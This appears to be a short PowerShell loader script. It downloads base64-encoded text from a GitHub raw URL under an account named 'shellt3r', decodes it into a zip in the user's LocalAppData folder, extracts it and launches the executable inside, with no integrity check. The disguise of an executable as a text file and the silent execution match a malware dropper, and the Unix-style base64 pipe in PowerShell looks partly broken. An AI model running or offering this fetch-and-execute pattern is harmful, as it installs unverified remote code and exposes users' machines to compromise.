$url = "https://raw.githubusercontent.com/shellt3r/app/main/app.txt"
$destino = "$env:LocalAppData\MeuApp"
if (!(Test-Path -Path $destino)) {New-Item -ItemType Directory -Path $destino}
curl $url | base64 -d > "$destino\app.zip"
Expand-Archive -Path "$destino\app.zip" -DestinationPath $destino -Force
Start-Process "$destino\app\app.exe"
